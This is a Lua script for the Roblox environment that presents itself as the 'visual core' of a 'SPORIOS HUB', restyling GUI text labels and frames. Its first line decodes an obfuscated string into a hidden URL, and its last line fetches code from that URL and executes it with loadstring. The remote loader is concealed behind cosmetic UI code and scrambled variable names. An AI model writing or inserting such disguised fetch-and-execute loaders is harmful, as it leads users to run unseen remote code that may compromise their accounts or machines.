
--[[ STAGE 2: VISUAL CORE ]]
local DGEvrm4kHURp0amn6hy="\051\021\010\210\033\030\047\103\062\056\114\010\121\077\073\166\175\175\081\163\134\128\135\150\141\187\149\153\230\247\243\240\193\231\197\223\208\222\039\054\047\048\033\051\053\062\013\103\108\101\112\105\118\066\075\105\017\094\095\093\175\119\178\184\179\151\137\143\147\226\152\171\238\251\196\253\207\205\211\213\032\047\052\243\063\007\057\202\030\030\019\104\104\119\105\070\127\075\083\078\167\088\170\173\169\126\141\189\148\087\093\174\237\232\242\248\242"local xaHNq5RL9ufVWsyWF=164 local XfbgL6AL7NZykAi4NtEne=37 local dIBSLPaEQhAXtOP=1 local BT0vTHDZg77FaK=6 local UoEbHdunXiM6=11 local JYZyWzlHz_LDXqviC1WWUQ=true local h6errWjKO7xkk=bit32 and bit32.bxor if not h6errWjKO7xkk then h6errWjKO7xkk=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local MGE69xJpgNMxYt2={}for fOx0HXe6pN8HU=1,#DGEvrm4kHURp0amn6hy do local OcJAJmP2hznWW2W7Sn2=string.byte(DGEvrm4kHURp0amn6hy,fOx0HXe6pN8HU)local t62IRKZ34P_H0H8=(XfbgL6AL7NZykAi4NtEne+(fOx0HXe6pN8HU*BT0vTHDZg77FaK)+UoEbHdunXiM6)%256 if dIBSLPaEQhAXtOP==0 then OcJAJmP2hznWW2W7Sn2=(OcJAJmP2hznWW2W7Sn2-t62IRKZ34P_H0H8)%256 MGE69xJpgNMxYt2[fOx0HXe6pN8HU]=string.char(h6errWjKO7xkk(OcJAJmP2hznWW2W7Sn2,xaHNq5RL9ufVWsyWF))else OcJAJmP2hznWW2W7Sn2=h6errWjKO7xkk(OcJAJmP2hznWW2W7Sn2,xaHNq5RL9ufVWsyWF)MGE69xJpgNMxYt2[fOx0HXe6pN8HU]=string.char((OcJAJmP2hznWW2W7Sn2-t62IRKZ34P_H0H8)%256)end end local B5Fp7vni6MVF=table.concat(MGE69xJpgNMxYt2)if JYZyWzlHz_LDXqviC1WWUQ then B5Fp7vni6MVF=string.reverse(B5Fp7vni6MVF)end local mmZhCmjFA8Q10=B5Fp7vni6MVF
local HubName = "SPORIOS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(mmZhCmjFA8Q10))()
